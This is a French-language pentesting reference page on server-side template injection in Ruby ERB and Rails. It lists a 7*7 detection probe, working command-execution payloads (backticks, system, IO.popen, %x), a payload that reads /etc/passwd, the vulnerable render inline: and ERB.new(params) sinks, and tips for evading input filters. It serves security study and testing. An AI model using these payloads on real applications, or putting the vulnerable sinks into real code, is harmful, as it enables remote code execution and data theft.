---
title: "Injection de template côté serveur ERB"
description: "Exploitation d'une SSTI ERB : ERB évalue directement du Ruby embarqué, si bien qu'une injection devient une exécution de commande immédiate via les backticks, system ou IO.popen, y compris le sink render inline: de Rails."
keywords:
  - SSTI ERB
  - render inline
  - IO.popen
  - backticks Ruby
  - Erubi
---

# ERB

ERB évalue du Ruby à l'intérieur de `<%= expression %>` (sortie) et `<% statement %>` (sans sortie) sans sandbox, si bien que confirmer le moteur et obtenir une RCE sont une seule et même étape. Un `<%= 7*7 %>` reflété qui rend `49` confirme l'évaluation ; n'importe laquelle des primitives de commande de Ruby exécute alors une commande shell :

```erb
<%= `id` %>
<%= system('id') %>
<%= IO.popen('id').read %>
<%= %x(id) %>
```

Les backticks et `%x{}` renvoient la sortie de la commande pour affichage, `IO.popen(...).read` fait de même, et `system` exécute la commande (en renvoyant true/false). Pour lire des fichiers sans lancer de processus, les primitives d'entrée/sortie de Ruby sont directement disponibles :

```erb
<%= File.open('/etc/passwd').read %>
```

Dans Rails, le sink habituel est `render inline:` avec une entrée utilisateur interpolée, ou un template ERB construit à partir d'un paramètre :

```ruby
render inline: "<%= #{params[:x]} %>"
ERB.new(params[:template]).result(binding)
```

Les deux compilent l'entrée de l'attaquant comme du Ruby. Erubi (le moteur par défaut de Rails depuis la 5.1) et l'ancien Erubis se comportent de la même façon pour l'exploitation ; la syntaxe des balises et l'évaluation directe sont identiques, si bien que les payloads ci-dessus se transposent sans modification.

La condition préalable est que l'entrée soit traitée comme la source du template, et non comme une valeur passée à un template existant (que Rails échappe en tant que donnée). Confirmez la réflexion `<%= 7*7 %>`, puis utilisez la forme backtick ou `IO.popen` pour lire la sortie. Comme il n'y a pas de sandbox, les seuls obstacles sont les filtres d'entrée côté application, contournés grâce aux nombreux équivalents de Ruby (`send`, `%x`, `Kernel.system`, chaînes échappées en `\u`).

## Outils

- tplmap, SSTImap

## Références

- Documentation Ruby ERB ; guide de rendu Rails (render inline:)
- PortSwigger Web Security Academy: Server-side template injection
